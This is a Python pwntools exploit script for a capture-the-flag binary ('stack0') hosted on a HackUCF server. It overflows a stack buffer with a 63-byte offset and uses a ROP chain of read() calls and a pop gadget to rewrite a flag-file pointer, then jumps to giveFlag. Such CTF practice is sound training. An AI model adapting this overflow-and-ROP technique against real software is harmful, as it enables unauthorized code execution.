#!/usr/bin/env python3
from pwn import *
import sys
from time import sleep

binary = "./stack0"
elf = context.binary = ELF(binary, False)
context.terminal = ["terminator", "-x", "bash", "-c"]
context.log_level  = 'debug'
libc = elf.libc
rop = ROP(elf)

#### GDB Script
script = '''

'''


io = None
r = lambda *a, **k: io.recv(*a, **k)
rl = lambda *a, **k: io.recvline(*a, **k)
ru = lambda *a, **k: io.recvuntil(*a, **k)
rr = lambda *a, **k: io.recvregex(*a, **k)
cl = lambda *a, **k: io.clean(*a, **k)
s = lambda *a, **k: io.send(*a, **k)
sa = lambda *a, **k: io.sendafter(*a, **k)
st = lambda *a, **k: io.sendthen(*a, **k)
sl = lambda *a, **k: io.sendline(*a, **k)
sla = lambda *a, **k: io.sendlineafter(*a, **k)
slt = lambda *a, **k: io.sendlinethen(*a, **k)
ia = lambda *a, **k: io.interactive(*a, **k)

def start(*args, **kwargs):
    usage = f"{sys.argv[0]} gdb \nor \n{sys.argv[0]} remote"
    # [ip, port]
    REMOTE = ["ctf.hackucf.org", 32101]
    if args:
        arguments = [elf.path]
        arguments.extend(args)
        return process(arguments)

    if not args and not kwargs:
        if len(sys.argv) > 1:
            if sys.argv[1] == 'gdb':
                return gdb.debug(elf.path, gdbscript=script)
            elif sys.argv[1] == 'remote':
                return remote(REMOTE[0], REMOTE[1])
            else:
                print("INVALID ARGUMENT")
                print(usage)
                sys.exit(0)
        else:
            return process(elf.path)


def main():
    global io
    #################### 
    ### EXPLOIT CODE ###
    ####################
    
    io = start()
    offset = 63 # offset to eip

    flag = b"flag2.txt\x00"
    #writable location .bss
    bss = 0x804b3ec
    #flag file address
    flagfile_addr_ptr = 0x804b3e8 #0x804b3e8
    # read
    read_ = 0x080490c0 # read(int fd, buf, size)
    #0x08049400 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
    gadget =  0x08049400 

    # function ptr
    giveFlag = elf.sym["giveFlag"]
    payload = flat(
	    cyclic(63), # bytes to fill buffer up to EIP
	    # write flag2.txt to writable memory
	    read_, # read function address from giveflag function
	    gadget, #  pop ebx ; pop esi ; pop edi ; pop ebp ; ret
	    0, # stdin
	    bss, # buf address where is will be store (writeable memory)
	    11, # len
	    0x0, # junk
	    #overwrite the flagfile variable pointer
	    read_, # read function address from giveflag function
	    gadget, #  pop ebx ; pop esi ; pop edi ; pop ebp ; ret
	    0, # stdin
	    flagfile_addr_ptr, # hardcoded flagfile addr
	    0x0,
	    giveFlag, # giveflag function ptr
    )
    sl(payload)
    sleep(0.5)
    sl(flag)
    sleep(0.5)
    sl(p32(bss))
    ia()


if __name__ == "__main__":
    main()

